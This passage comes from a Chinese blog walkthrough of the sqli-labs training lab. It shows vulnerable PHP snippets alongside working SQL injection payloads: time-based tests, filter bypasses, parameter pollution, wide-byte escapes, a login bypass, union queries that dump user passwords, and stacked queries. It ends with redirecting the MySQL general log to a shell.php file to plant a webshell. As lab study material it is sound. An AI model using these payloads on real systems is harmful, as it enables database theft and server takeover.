0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>尝试注入</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 测试闭合情况</span><br>?id=<span class="hljs-number">1</span>%26%261<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%26%26sleep(3)%26%26&quot;</span><span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code> </p><p>关键词：基于错误、过滤 Union 和 Select、单引号+括号<br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment"># 过滤 /*</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># 过滤 - # 注释</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># 过滤 空格 +</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);.<br><br><br><span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-keyword">return</span> $id;<br><br></code></pre></td></tr></table></figure><p>过滤 union select /i 大小写都过滤：只能采用双写的方式进行注入</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 测试SQL语句是否执行<br> ?id=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>(&#x27;<span class="hljs-number">1</span><br><br># 延时注入Payload<br>?id=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>(&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>关键代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-keyword">function</span> blacklist(<span class="hljs-variable">$id</span>)<br>&#123;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>strip out /*<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out --.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#.</span><br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-regexp">//</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>); <span class="hljs-regexp">//</span>Strip out spaces.<br>return <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>测试 Payload：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># 闭合 SQL</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 联合注入 Payload（国光大佬的 payload 测试失败）</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1, 2, 3--+</span><br><br></code></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：GET、基于错误、WAF</p><p>index.php 关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">if</span> 有结果：<br>    输出<br><span class="hljs-keyword">else</span>：<br>    输出报错信息<br><br></code></pre></td></tr></table></figure><p>第一题太简单了吧，联合注入 Payload</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>--+<br><br></code></pre></td></tr></table></figure><p>login.php 关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">// 获取查询的字符串</span><br>$qs = $_SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><span class="hljs-comment">// 模拟Tomcat进行中间过滤</span><br>$id1=java_implimentation($qs);<br>$id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br><span class="hljs-comment">// 白名单</span><br>whitelist($id1);<br><br><span class="hljs-comment">// SQL语句</span><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br><span class="hljs-comment">// WAF</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params">$input</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 检测数字 以数字开头，以数字结尾</span><br>    $match = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, $input);<br>    <span class="hljs-keyword">if</span>($match)<br>    &#123;<br>        <span class="hljs-comment">//echo &quot;you are good&quot;;</span><br>        <span class="hljs-comment">//return $match;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;    <br>        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br>        <span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// 限制id的长度</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params">$query_string</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $q_s = $query_string;<br>    $qs_array= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,$q_s);<br><br><br>    <span class="hljs-keyword">foreach</span>($qs_array <span class="hljs-keyword">as</span> $key =&gt; $value)<br>    &#123;<br>        $val=substr($value,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span>($val==<span class="hljs-string">&quot;id&quot;</span>)<br>        &#123;<br>            $id_value=substr($value,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>); <br>            <span class="hljs-keyword">return</span> $id_value;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>同时传入两个 id，当前一个 id 被 java_implimentation 捕获的时候（模拟 Tomcat 的解析），第一个 id 就会进入 WAF，如果检测合格则将 GET 参数中的 id 插入 SQL 语句（第二个 id，而不是进入 WAF的 id）。最后的 payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><ul><li>Apache PHP 会解析最后一个参数</li><li>Tomcat JSP 会解析第一个参数</li></ul><hr><h2 id="less-30-1"><a href="#less-30-1" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>同第29题，仅闭合方式不同。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># 简单测试一下</span><br>?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span><span class="hljs-string">&quot; and sleep(3) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 联合注入</span><br><span class="hljs-string">?id=1&amp;id=0&quot;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">users</span>)--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p><p>同29题，仅拼接方式不同。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># unino注入</span><br><span class="hljs-string">?id=1&amp;id=0&quot;)</span> <span class="hljs-string">union</span> <span class="hljs-string">select</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-number">3</span><span class="hljs-string">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>关键词：GET、联合注入、报错注入、布尔盲注、延时注入、绕过addslashes</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>$id=check_addslashes($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br><span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params">$string</span>)</span><br><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># \ 转换为 \\</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, $string); <br>     <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, $string);   <br>     <span class="hljs-comment"># 将 &quot; 转为\&quot;</span><br>    $string = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, $string);                                <br>    <span class="hljs-keyword">return</span> $string;<br>&#125;<br><br>mysqli_query($con1, <span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>宽字节注入原理：</p><ul><li>%df吃掉%5c：&#39; 进行url编码后为%5c%27，在%5c%27前添加%df，当MySQL的编码为GBK时（mysqli_query($con1, “SET NAMES gbk”);），%df%5c会被作为一个汉字，%27作为单引号独立，就可以逃脱%5c（\）的限制。</li><li>%5c吃掉%5c：将反斜杠作为字符，然后让%27（’）不受前面的%5c限制。（这里无法使用%5c）</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 简单测试</span><br>?id=1%df&#x27; and sleep(3)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># 有明显延时</span><br>?id=1%5c&#x27; and sleep(3)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># 没有延时</span><br><br><span class="hljs-comment"># union注入</span><br>?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>关键词：绕过 addslashes</p><p>类似上一题，不过采用 addslashes 函数添加反斜杠，Payload 同上一题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params">$string</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $string= addslashes($string);    <br>    <span class="hljs-keyword">return</span> $string;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>addslashes函数转义的字符</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex"><br><span class="hljs-tag">\<span class="hljs-name"> </span>  =</span>&gt;  <span class="hljs-tag">\<span class="hljs-name">\</span></span><br>&#x27;   =&gt;  <span class="hljs-tag">\<span class="hljs-name">&#x27;</span></span><br>&quot;   =&gt;  <span class="hljs-tag">\<span class="hljs-name">&quot;</span></span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p><p>过滤方法同 less-33</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$uname = addslashes($uname1);<br>$passwd= addslashes($passwd1);<br><br></code></pre></td></tr></table></figure><p>尝试注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># union注入</span><br>uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=233</span><br><br></code></pre></td></tr></table></figure><p>还可以使用 UTF-16 或 UTF-32，效果同<code>%df</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br>~ » <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27; | iconv -f utf-8 -t utf-16</span><br><span class="hljs-string">��&#x27;</span><br>-------------------------------------------------------------<br>~ » <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27; | iconv -f utf-8 -t utf-32</span><br><span class="hljs-string">��&#x27;</span><br><br></code></pre></td></tr></table></figure><p>构造万能密码</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br>uname=�&#x27; or 1<span class="hljs-comment">#&amp;passwd=</span><br><br></code></pre></td></tr></table></figure><p>在 MySQL 中执行的 SQL 语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> 1#<span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$passwd&#x27;</span> LIMIT 0,1<br><br></code></pre></td></tr></table></figure><p>这个符号的效果类似于 %df，进行联合注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>闭合方式：<code>id=$id</code></p><p>这个关卡不需要使用单引号即可进行注入</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">security</span>.<span class="hljs-title">users</span>) --+</span><br><br></code></pre></td></tr></table></figure><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：绕过 mysql_real_escape_string 函数</p><p>mysql_real_escape_string 函数类似 addslashes 函数，会对反斜杠、单引号、双引号进行检测并添加转义字符，所以方法和 less-34 一样</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=-<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="hljs-string">?id=-1�&#x27;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">security</span>.<span class="hljs-title">users</span>) --+ </span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p><p>关键词：绕过 mysql_real_escape_string 函数</p><p>同上一题，GET 方法改为 POST 方法。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">uname</span>=%df&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(username,password SEPARATOR <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) FROM users)#&amp;passwd=<br><span class="hljs-attribute">uname</span>=�&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(username,password SEPARATOR <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) FROM users)#&amp;passwd=<br><br></code></pre></td></tr></table></figure><hr><h1 id="4-堆叠注入-38-53"><a href="#4-堆叠注入-38-53" class="headerlink" title="4 堆叠注入(38-53)"></a>4 堆叠注入(38-53)</h1><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>添加字段值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>使用 SQL 语句进行查询是否添加成功</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>select * <span class="hljs-keyword">from</span> users;<br><br></code></pre></td></tr></table></figure><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （Hyuga、CEYE）</li><li>Windows 平台</li></ol><p>无 windows 暂时不测试</p><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>查看本地配置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; show variables like <span class="hljs-emphasis">&#x27;general%&#x27;</span>;<br><span class="hljs-code">+------------------+</span>-----------------------------------------------------+<br>| Variable<span class="hljs-emphasis">_name    | Value                                               |</span><br><span class="hljs-emphasis">+------------------+-----------------------------------------------------+</span><br><span class="hljs-emphasis">| general_</span>log      | OFF                                                 |<br>| general<span class="hljs-emphasis">_log_</span>file | /Applications/MxSrvs/bin/mysql/data/MacBook-Pro.log |<br><span class="hljs-code">+------------------+</span>-----------------------------------------------------+<br>2 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>默认没有开启，尝试手动开启，并配置目录路径（我的项目路径为：/Users/littlechieh6/Documents/project/sqli-labs-php7）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;</span>;<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>再次查看配置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 